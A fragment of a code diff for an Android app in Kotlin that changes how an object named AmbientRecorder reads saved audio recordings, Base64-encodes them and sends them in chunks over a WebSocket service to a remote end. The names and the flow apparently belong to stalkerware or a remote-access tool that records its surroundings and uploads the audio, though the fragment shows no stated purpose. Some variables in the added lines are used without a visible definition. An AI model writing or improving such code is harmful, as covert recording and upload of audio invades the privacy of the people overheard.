@@ -109,21 +109,16 @@ object AmbientRecorder {
                     var read: Int
                     while (stream.read(buf).also { read = it } != -1) {
                         val b64 = android.util.Base64.encodeToString(buf.copyOf(read), android.util.Base64.NO_WRAP)
-                val b64    = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-                // Split into 64KB chunks to stay under WebSocket frame limits
-                val chunkSize = 64 * 1024
-                val totalChunks = (b64.length + chunkSize - 1) / chunkSize
-                for (i in 0 until totalChunks) {
-                    val start = i * chunkSize
-                    val end   = minOf(start + chunkSize, b64.length)
-                    CoreService.instance?.sendData("recording_chunk", JSONObject().apply {
-                        put("filename",     file.name)
-                        put("chunk",        i)
-                        put("total_chunks", totalChunks)
-                        put("data",         b64.substring(start, end))
-                        put("size_kb",      file.length() / 1024)
-                    })
-                    Thread.sleep(50) // avoid flooding WebSocket
+                        CoreService.instance?.sendData("recording_chunk", JSONObject().apply {
+                            put("filename",    file.name)
+                            put("chunk",       chunkIndex)
+                            put("total_chunks",totalChunks)
+                            put("data",        b64)
+                            put("size_kb",     file.length() / 1024)
+                        })
+                        chunkIndex++
+                        Thread.sleep(50)
+                    }
                 }
             } catch (e: Exception) {
                 CoreService.instance?.sendData("recording_error", JSONObject().apply {
@@ -139,3 +134,4 @@ object AmbientRecorder {
             ?.sortedByDescending { it.lastModified() } ?: emptyList()
     }
 }
+
